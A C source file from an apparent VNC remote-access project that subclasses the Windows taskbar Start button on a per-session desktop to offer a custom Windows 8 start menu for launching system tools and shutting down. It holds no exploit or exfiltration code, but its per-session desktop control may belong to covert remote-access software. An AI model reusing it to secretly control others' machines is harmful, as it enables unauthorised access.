//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: start_menu.c
// $Revision: 206 $
// $Date: 2014-07-16 12:50:30 +0400 (Ср, 16 июл 2014) $
// description:
//	win8 start menu

#include "project.h"
#include "exec.h"

#pragma warning(disable:4244)

static TCHAR szStartMenuWindowClass[GUID_STR_LENGTH+1];

#define IDS_PROGRAMS_AND_FEATURES "Programs and Features"
#define IDS_POWER_OPTIONS         "Power Options"
#define IDS_EVENT_VIEWER          "Event Viewer"
#define IDS_SYSTEM                "System"
#define IDS_DEVICE_MANAGER        "Device Manager"
#define IDS_NETWORK_CONNECTIONS   "Network Connections"
#define IDS_DISK_MANAGEMENT       "Disk Management"
#define IDS_COMPUTER_MANAGEMENT   "Computer Management"
#define IDS_COMMAND_PROMPT        "Command Prompt"
#define IDS_TASK_MANAGER          "Task Manager"
#define IDS_CONTROL_PANEL         "Control Panel"
#define IDS_FILE_EXPLORER         "File Explorer"
#define IDS_SEARCH                "Search"
#define IDS_RUN                   "Run"
#define IDS_SHUTDOWN              "Shutdown"
#define IDS_REBOOT                "Restart"
#define IDS_LOGOFF                "Logoff"
#define IDS_DESKTOP               "Desktop"

#define IDC_PROGRAMS_AND_FEATURES 100
#define IDC_POWER_OPTIONS         101
#define IDC_EVENT_VIEWER          102
#define IDC_SYSTEM                103
#define IDC_DEVICE_MANAGER        104
#define IDC_NETWORK_CONNECTIONS   105
#define IDC_DISK_MANAGEMENT       106
#define IDC_COMPUTER_MANAGEMENT   107
#define IDC_COMMAND_PROMPT        108
#define IDC_TASK_MANAGER          109
#define IDC_CONTROL_PANEL         110
#define IDC_FILE_EXPLORER         111
#define IDC_SEARCH                112
#define IDC_RUN                   113
#define IDC_SHUTDOWN              114
#define IDC_REBOOT                115
#define IDC_LOGOFF                116
#define IDC_DESKTOP               117

#ifndef GET_X_LPARAM
	#define GET_X_LPARAM(lp)	((int)(short)LOWORD(lp))
#endif
#ifndef GET_Y_LPARAM
	#define GET_Y_LPARAM(lp)	((int)(short)HIWORD(lp))
#endif

#define CONTROL_APP  L"control.exe"
#define EVENTVWR_APP L"eventvwr.exe"
#define MMC_APP L"mmc.exe"
#define CMD_APP L"cmd.exe"
#define TASKMGR_APP L"taskmgr.exe"
#define EXPLORER_APP L"explorer.exe"

#define MS_PROGRAMS     L"/name Microsoft.ProgramsAndFeatures"
#define MS_POWER        L"/name Microsoft.PowerOptions"
#define MS_SYSTEM       L"/name Microsoft.System"
#define MS_DEVMANAGER   L"/name Microsoft.DeviceManager"
#define MS_DISKMGMNT    L"diskmgmt.msc"
#define MS_COMPMGMT     L"compmgmt.msc"
#define MS_ZERO         L"//0"

static DWORD SetPrivilegeAttribute(LPCTSTR PrivilegeName, DWORD NewPrivilegeAttribute, DWORD *OldPrivilegeAttribute)
{
	LUID             PrivilegeValue;
	TOKEN_PRIVILEGES TokenPrivileges, OldTokenPrivileges;
	DWORD            ReturnLength;
	HANDLE           TokenHandle;

	//
	// First, find out the LUID Value of the privilege
	//

	if(!LookupPrivilegeValue(NULL, PrivilegeName, &PrivilegeValue)) {
		return GetLastError();
	}

	//
	// Get the token handle
	//
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle)) {
		return GetLastError();
	}

	//
	// Set up the privilege set we will need
	//

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Luid = PrivilegeValue;
	TokenPrivileges.Privileges[0].Attributes = NewPrivilegeAttribute;

	ReturnLength = sizeof( TOKEN_PRIVILEGES );
	if (!AdjustTokenPrivileges (
		TokenHandle,
		FALSE,
		&TokenPrivileges,
		sizeof( TOKEN_PRIVILEGES ),
		&OldTokenPrivileges,
		&ReturnLength
		)) {
			CloseHandle(TokenHandle);
			return GetLastError();
	}
	else {
		if (OldPrivilegeAttribute != NULL) {
			*OldPrivilegeAttribute = OldTokenPrivileges.Privileges[0].Attributes;
		}
		CloseHandle(TokenHandle);
		return NO_ERROR;
	}
}

static BOOL DoRestart(DWORD dwExitWinCode)
{
	BOOL fOk, bOkToPowerOff = FALSE;
	DWORD dwExtraExitCode = 0;
	DWORD OldState, Status;
	DWORD dwErrorSave;

	SetLastError(0);        // Be really safe about last error value!

	Status = SetPrivilegeAttribute(SE_SHUTDOWN_NAME,
		SE_PRIVILEGE_ENABLED,
		&OldState);
	dwErrorSave = GetLastError();       // ERROR_NOT_ALL_ASSIGNED sometimes

	if (dwExitWinCode == EWX_SHUTDOWN ||
		dwExitWinCode == EWX_REBOOT ||
		dwExitWinCode == EWX_LOGOFF )
	{
		if (GetKeyState(VK_CONTROL) < 0)
		{
			dwExtraExitCode |= EWX_FORCE;
		}
	}
	fOk = ExitWindowsEx(dwExitWinCode|dwExtraExitCode, 0);

	//
	// If we were able to set the privilege, then reset it.
	//
	if (NT_SUCCESS(Status) && dwErrorSave == 0)
	{
		SetPrivilegeAttribute(SE_SHUTDOWN_NAME, OldState, NULL);
	}
	return fOk;
}


static
HMENU
	CreateStartMenu(
		VOID
		)
{
	HMENU hMenu;
	do{
		hMenu = CreatePopupMenu ();
		if ( hMenu == NULL ){
			DbgPrint("CreateMenu failed, err=%lu\n",GetLastError());
			break;
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_PROGRAMS_AND_FEATURES,IDS_PROGRAMS_AND_FEATURES)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_PROGRAMS_AND_FEATURES,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_POWER_OPTIONS,IDS_POWER_OPTIONS)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_POWER_OPTIONS,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_EVENT_VIEWER,IDS_EVENT_VIEWER)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_EVENT_VIEWER,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_SYSTEM,IDS_SYSTEM)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_SYSTEM,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_DEVICE_MANAGER,IDS_DEVICE_MANAGER)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_DEVICE_MANAGER,GetLastError());
		}
		//if ( !AppendMenuA(hMenu,MF_STRING,IDC_NETWORK_CONNECTIONS,IDS_NETWORK_CONNECTIONS)){
		//	DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_NETWORK_CONNECTIONS,GetLastError());
		//}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_DISK_MANAGEMENT,IDS_DISK_MANAGEMENT)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_DISK_MANAGEMENT,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_COMPUTER_MANAGEMENT,IDS_COMPUTER_MANAGEMENT)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_COMPUTER_MANAGEMENT,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_COMMAND_PROMPT,IDS_COMMAND_PROMPT)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_COMMAND_PROMPT,GetLastError());
		}
		AppendMenuA(hMenu,MF_SEPARATOR,0,NULL);
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_TASK_MANAGER,IDS_TASK_MANAGER)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_TASK_MANAGER,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_CONTROL_PANEL,IDS_CONTROL_PANEL)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_CONTROL_PANEL,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_FILE_EXPLORER,IDS_FILE_EXPLORER)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_FILE_EXPLORER,GetLastError());
		}
		//if ( !AppendMenuA(hMenu,MF_STRING,IDC_SEARCH,IDS_SEARCH)){
		//	DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_SEARCH,GetLastError());
		//}
		//if ( !AppendMenuA(hMenu,MF_STRING,IDC_RUN,IDS_RUN)){
		//	DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_RUN,GetLastError());
		//}
		AppendMenuA(hMenu,MF_SEPARATOR,0,NULL);
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_SHUTDOWN,IDS_SHUTDOWN)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_SHUTDOWN,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_REBOOT,IDS_REBOOT)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_REBOOT,GetLastError());
		}
		if ( !AppendMenuA(hMenu,MF_STRING,IDC_LOGOFF,IDS_LOGOFF)){
			DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_LOGOFF,GetLastError());
		}
		//if ( !AppendMenuA(hMenu,MF_STRING,IDC_DESKTOP,IDS_DESKTOP)){
		//	DbgPrint("AppendMenuA(%s) failed, err=%lu\n",IDS_DESKTOP,GetLastError());
		//}
	} while ( FALSE );

	return hMenu;
}

VOID 
	StartMenuOnContextMenu(
		HWND hWnd,
		int xPos,
		int yPos
		)
{
	HMENU hMenu = CreateStartMenu();
	if ( hMenu ){
		TrackPopupMenu( 
			hMenu, 
			TPM_RIGHTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON,
			xPos,yPos,0,
			hWnd, NULL
			);
		DestroyMenu( hMenu );
	}
}

VOID 
	StartMenuOnCommand(
		HWND hWnd,
		WORD Command
		)
{
	STARTUPINFOA	Si = {0};
	switch ( Command )
	{
	case IDC_PROGRAMS_AND_FEATURES:
		ExecuteCommandW(CONTROL_APP,MS_PROGRAMS);
		break;
	case IDC_POWER_OPTIONS:
		ExecuteCommandW(CONTROL_APP,MS_POWER);
		break;
	case IDC_EVENT_VIEWER:
		ExecuteCommandW(EVENTVWR_APP,NULL);
		break;
	case IDC_SYSTEM:
		ExecuteCommandW(CONTROL_APP,MS_SYSTEM);
		break;
	case IDC_DEVICE_MANAGER:
		ExecuteCommandW(CONTROL_APP,MS_DEVMANAGER);
		break;
	case IDC_NETWORK_CONNECTIONS:
		break;
	case IDC_DISK_MANAGEMENT:
		ExecuteCommandW(MMC_APP,MS_DISKMGMNT);
		break;
	case IDC_COMPUTER_MANAGEMENT:
		ExecuteCommandW(MMC_APP,MS_COMPMGMT);
		break;
	case IDC_COMMAND_PROMPT:
		ExecuteCommandW(CMD_APP,NULL);
		break;
	case IDC_TASK_MANAGER:
		ExecuteCommandW(TASKMGR_APP,MS_ZERO);
		break;
	case IDC_CONTROL_PANEL:
		ExecuteCommandW(CONTROL_APP,NULL);
		break;
	case IDC_FILE_EXPLORER:
		ExecuteCommandW(EXPLORER_APP,NULL);
		break;
	case IDC_SEARCH:
		break;
	case IDC_RUN:
		break;
	case IDC_SHUTDOWN:
		DoRestart(EWX_SHUTDOWN);
		break;
	case IDC_REBOOT:
		DoRestart(EWX_REBOOT);
		break;
	case IDC_LOGOFF:
		DoRestart(EWX_LOGOFF);
		break;
	case IDC_DESKTOP:
		break;
	}
}

WNDPROC g_ButtonProc = NULL;

LRESULT CALLBACK StartButtonSubclassWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		StartMenuOnCommand(hwnd,LOWORD(wParam));
		return 0;
	//case WM_RBUTTONUP:
	case WM_CONTEXTMENU:
		StartMenuOnContextMenu(hwnd,GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam));
		return 0;
	}
	return CallWindowProc(g_ButtonProc, hwnd, uMsg, wParam, lParam);
}

WINERROR
	StartMenuInitialize(
		IN PVNC_SESSION pSession
		)
{
	WINERROR Status = NO_ERROR;
	HWND hStartBtn = NULL;
	HWND hTrayWnd = NULL;

	while ( 
		(hTrayWnd = FindWnd(NULL,_T("Shell_TrayWnd"),NULL)) == NULL &&
		!pSession->Desktop.StartMenu.bShutdown)
	{
		Sleep ( 100 );
	}

	while ( 
		(hStartBtn = FindWnd(hTrayWnd,_T("Start"),_T("Start"))) == NULL &&
		!pSession->Desktop.StartMenu.bShutdown)
	{
		Sleep ( 100 );
	}

	g_ButtonProc = 
		( WNDPROC )(LONG_PTR)
			SetWindowLongPtr( hStartBtn, GWLP_WNDPROC, ( LONG_PTR )(PVOID)StartButtonSubclassWndProc );
	return Status;
}

VOID WINAPI StartMenuTread(PVNC_SESSION pSession)
{
	SetThreadDesktop( pSession->Desktop.hDesktop );

	// create start menu for win8
	if ( StartMenuInitialize(pSession) == NO_ERROR )
	{
		pSession->Desktop.StartMenu.bStarted = TRUE;

		while ( pSession->Desktop.StartMenu.bShutdown == FALSE )
		{
			MSG msg;
			if (!GetMessage(&msg,NULL,0,0))
				break;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		pSession->Desktop.StartMenu.bStarted = FALSE;
	}
	return;
}

void StartMenuStart(PVNC_SESSION pSession)
{
	// create start menu for win8
	if ( OsGetMajorVersion() > 6 || 
		(OsGetMajorVersion() == 6) && (OsGetMinorVersion() > 1) )
	{
		if (pSession->Desktop.StartMenu.bStarted)
			return;
		pSession->Desktop.StartMenu.hThread =
			CreateThread(
				NULL,0,
				(LPTHREAD_START_ROUTINE)StartMenuTread,
				pSession,
				0,
				&pSession->Desktop.StartMenu.ThreadID
				);
	}
	return;
}

void StartMenuStop(PVNC_SESSION pSession)
{
	pSession->Desktop.StartMenu.bShutdown = TRUE;
	if ( pSession->Desktop.StartMenu.hThread ){
		if (pSession->Desktop.StartMenu.bStarted)
		{
			PostThreadMessage( 
				pSession->Desktop.StartMenu.ThreadID,
				WM_NULL,0,0
				);
		}

		WaitForSingleObject( pSession->Desktop.StartMenu.hThread, INFINITE );
		CloseHandle( pSession->Desktop.StartMenu.hThread );
		pSession->Desktop.StartMenu.hThread = NULL;
	}
	pSession->Desktop.StartMenu.bShutdown = FALSE;
}
